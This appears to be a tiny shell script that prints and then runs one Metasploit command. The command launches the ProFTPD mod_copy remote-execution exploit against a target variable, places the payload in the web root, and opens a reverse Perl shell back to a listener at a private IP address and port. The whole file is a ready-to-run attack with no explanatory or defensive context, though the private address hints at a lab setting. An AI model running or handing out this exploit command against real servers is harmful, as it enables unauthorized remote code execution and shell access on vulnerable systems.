echo /usr/bin/msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec;set rhost $TARGET;set sitepath /var/www/html;set payload cmd/unix/reverse_perl;set lhost 10.0.2.8;set lport 4567; run;"

/usr/bin/msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec;set rhost $TARGET;set sitepath /var/www/html;set payload cmd/unix/reverse_perl;set lhost 10.0.2.8;set lport 4567; run;"

